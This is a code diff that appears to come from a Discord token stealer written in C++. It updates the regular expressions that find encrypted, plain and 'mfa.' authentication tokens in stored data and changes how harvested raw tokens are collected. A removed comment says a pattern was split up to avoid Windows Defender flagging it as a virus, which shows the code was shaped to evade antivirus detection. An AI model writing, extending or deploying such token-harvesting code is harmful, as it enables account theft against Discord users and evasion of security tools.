@@ -66,13 +66,10 @@ public:
             regex_list.emplace_back(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)", std::regex::optimize);
             regex_list.emplace_back("dQw4w9WgXcQ:(.*?)=", std::regex::optimize);
 
-            // Cant write the regex as one part because windows defender gives a virus flag because that this is a JWT pattern
-            std::string regex_part_1 = R"([\w-]{24}\.[\)";
-            std::string regex_part_2 = R"(w-]{6}\)";
-            std::string regex_part_3 = R"(.[\w-]{27})";
-
-            regex_list.emplace_back(regex_part_1 + regex_part_2 + regex_part_3, std::regex::optimize);
-            regex_list.emplace_back(R"(mfa\.(?:\w|-){84})", std::regex::optimize);
+            regex_list.emplace_back(R"([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})", std::regex::optimize);
+            regex_list.emplace_back(R"([\w-]{26}\.[\w-]{6}\.[\w-]{15}\_[\w-]{22})", std::regex::optimize);
+            regex_list.emplace_back(R"("\b\w{26}\.\w{6}\.[\w-]{27}\b")", std::regex::optimize);
+            regex_list.emplace_back(R"(mfa\.[\w-]{80,95})", std::regex::optimize);
 
             std::mutex mtx;
 
@@ -121,7 +118,7 @@ public:
             for (const std::string &raw_token : encrypted_token_list) {
 
                 if (raw_token.find("dQw4w9WgXcQ") == std::string::npos) {
-                    result.push_back("UNDECRYPTED_TOKEN{" + raw_token + "}");
+                    result.push_back(raw_token);
                     continue;
                 }
 
